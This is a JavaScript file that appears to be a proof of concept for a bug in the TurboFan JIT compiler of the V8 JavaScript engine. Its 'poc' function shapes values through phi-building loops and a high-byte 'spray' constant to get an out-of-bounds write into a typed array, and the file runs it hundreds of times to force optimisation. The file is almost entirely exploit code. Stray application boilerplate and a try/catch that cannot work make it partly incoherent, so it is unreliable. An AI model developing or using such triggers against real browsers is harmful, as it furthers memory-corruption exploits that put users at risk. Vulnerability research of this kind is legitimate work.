// script.js

// Define fake as a Typed Array globally
var fake = new Uint32Array(10);
fake[0] = 1;
fake[1] = 3;
fake[2] = 2;
fake[3] = 4;
fake[4] = 5;
fake[5] = 6;
fake[6] = 7;
fake[7] = 8;
fake[8] = 9;
fake[9] = 10; // Complete the array

var tahir = 0x1;

// Define oob_array globally as a Uint32Array with a fixed length of 10
// Adjust the length as needed based on your application's requirements
var oob_array = new Uint32Array(10);
oob_array.fill(0); // Initialize all elements to 0

console.log("script.js has been loaded.");
console.info("oob_array initialized globally.");

// Function to manipulate the global oob_array
function poc(a) {
  // Initialize or reset oob_array[0] if needed
  oob_array[0] = 0x500;
  
  let just_a_variable = fake[0];
  let another_variable3 = fake[7];
  
  if (a % 7 === 0) {
    another_variable3 = 0xff00000000; // Spray high bytes
  }
  
  another_variable3 = Math.max(another_variable3, tahir);
  another_variable3 = another_variable3 >>> 0;
  
  var index = fake[3];
  var for_phi_modes = fake[6];
  let c = fake[1];
  
  // Giant loop to generate cyclic graph
  for (var i = 0; i < 10; i++) {
    if (a % 3 === 0) {
      just_a_variable = c;
    }
    if (a % 37 === 0) {
      just_a_variable = fake[2];
    }
    if (a % 11 === 0) {
      just_a_variable = fake[8];
    }
    if (a % 17 === 0) {
      just_a_variable = fake[5];
    }
    if (a % 19 === 0) {
      just_a_variable = fake[4];
    }
    if (a % 7 === 0 && i >= 5) {
      for_phi_modes = just_a_variable;
      just_a_variable = another_variable3;
    }
    if (i >= 6) {
      for (let j = 0; j < 5; j++) {
        if (a % 5 === 0) {
          index = for_phi_modes;
          try {
            oob_array[index] = 0x500; // Attempting OOB write
            console.log(`oob_array[${index}] set to 0x500`);
          } catch (e) {
            console.error(`OOB Write Attempted: ${e.message}`);
          }
        }
      }
    }
    for_phi_modes = c;
    c = just_a_variable;
  }
  
  // Zero extend
  return [index, BigInt(just_a_variable)];
}

// Loop to execute poc multiple times
for (let i = 2; i < 0x500; i++) {
  poc(i); // Compile using Turbofan (JavaScript engine)
}

// Final call to poc with a specific value
poc(7 * 5);
